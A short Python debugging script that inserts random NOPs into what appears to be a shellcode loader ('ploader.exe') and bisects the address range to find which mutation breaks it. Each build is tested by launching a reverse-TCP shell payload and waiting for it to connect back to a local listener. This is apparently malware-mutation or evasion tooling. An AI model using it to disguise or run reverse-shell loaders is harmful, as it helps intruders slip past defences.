import socket
import subprocess
import sys

sys.path.insert(0, ".")
import zone_v2 as Z

EXE = "ploader.exe"
PAYLOAD = "original_pl/x64/windows_x64_custom_reverse_tcp.bin"


def build(window, path, seed=7):
    class Z2(Z.Zone):
        def equal_instructions(self, probability=100):
            return 0

        def _can_insert_after(self, item):
            if not (window[0] <= item.old_rva < window[1]):
                return False
            return super()._can_insert_after(item)

    z = Z2(EXE, seed=seed, verbose=False)
    z.insert_random_nop(probability=100)
    z.write_pe_file(path)
    return z.added_bytes


def test(path):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(("127.0.0.1", 1234))
    sock.listen(1)
    sock.settimeout(5)
    proc = subprocess.Popen([path, PAYLOAD], stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL)
    try:
        conn, _ = sock.accept()
        conn.close()
        return True
    except socket.timeout:
        return False
    finally:
        try:
            proc.terminate()
            proc.wait(timeout=3)
        except Exception:
            try:
                proc.kill()
            except Exception:
                pass
        sock.close()


lo, hi = 0x1000, 0x12f5
while hi - lo > 8:
    mid = (lo + hi) // 2
    build((lo, mid), "tmp/bs2.exe")
    ok = test("tmp/bs2.exe")
    print("  [%#x,%#x) -> %s" % (lo, mid, "OK" if ok else "CRASH"))
    if ok:
        lo = mid
    else:
        hi = mid
print("finestra sospetta: %#x - %#x" % (lo, hi))

z = Z.Zone(EXE, verbose=False)
import bisect
order = sorted(z.insns)
pos = bisect.bisect_left(order, lo)
for rva in order[max(0, pos - 6):pos + 12]:
    insn = z.insns[rva]
    print("   %#x %-24s %s %s" % (rva, insn.bytes.hex(), insn.mnemonic, insn.op_str))
